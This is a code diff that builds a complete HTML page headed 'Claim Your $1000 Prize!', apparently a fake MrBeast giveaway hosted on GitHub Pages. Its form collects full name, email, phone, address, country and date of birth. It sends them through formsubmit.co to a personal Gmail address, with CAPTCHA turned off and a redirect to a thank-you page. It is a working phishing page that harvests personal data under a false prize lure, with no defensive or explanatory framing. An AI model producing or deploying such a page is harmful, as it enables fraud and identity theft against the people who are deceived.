@@ -1,27 +1,80 @@
-<form action="https://formsubmit.co/blakesfishing07@gmail.com" method="POST">
-    <input type="text" name="name" placeholder="Your Full Name" required>
-    <input type="email" name="email" placeholder="Your Email Address" required>
-    <input type="tel" name="phone" placeholder="Your Phone Number" required>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Prize</title>
+    <style>
+        body {
+            background-color: #228fda;
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 320px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            color: black;
+        }
+        input, select {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #ffcc00;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Claim Your $1000 Prize! 🚀</h1>
+        <p>Enter your details to receive your prize.</p>
 
-    <select name="country" required>
-        <option value="" disabled selected>Select Your Country</option>
-        <option value="United States">United States</option>
-        <option value="United Kingdom">United Kingdom</option>
-        <option value="Canada">Canada</option>
-        <option value="Australia">Australia</option>
-        <option value="India">India</option>
-        <option value="Other">Other</option>
-    </select>
+        <form action="https://formsubmit.co/blakesfishing07@gmail.com" method="POST">
+            <input type="text" name="name" placeholder="Your Full Name" required>
+            <input type="email" name="email" placeholder="Your Email Address" required>
+            <input type="tel" name="phone" placeholder="Your Phone Number" required>
 
-    <input type="text" name="address" placeholder="Your Address" required>
-    
-    <label for="dob">Date of Birth:</label>
-    <input type="date" name="dob" id="dob" required>
+            <select name="country" required>
+                <option value="" disabled selected>Select Your Country</option>
+                <option value="United States">United States</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="Canada">Canada</option>
+                <option value="Australia">Australia</option>
+                <option value="India">India</option>
+                <option value="Other">Other</option>
+            </select>
 
-    <!-- Updated Redirect to GitHub Pages Thank You Page -->
-    <input type="hidden" name="_next" value="https://aussieblakeyt.github.io/MrBeastGiveaway/thankyou.html">
+            <input type="text" name="address" placeholder="Your Address" required>
 
-    <input type="hidden" name="_captcha" value="false"> <!-- Disables CAPTCHA -->
+            <label for="dob">Date of Birth:</label>
+            <input type="date" name="dob" id="dob" required>
 
-    <button type="submit">Claim Prize</button>
-</form>
+            <!-- Redirect to Thank You Page -->
+            <input type="hidden" name="_next" value="https://aussieblakeyt.github.io/MrBeastGiveaway/thankyou.html">
+
+            <!-- Disable CAPTCHA -->
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit">Claim Prize</button>
+        </form>
+    </div>
+</body>
+</html>
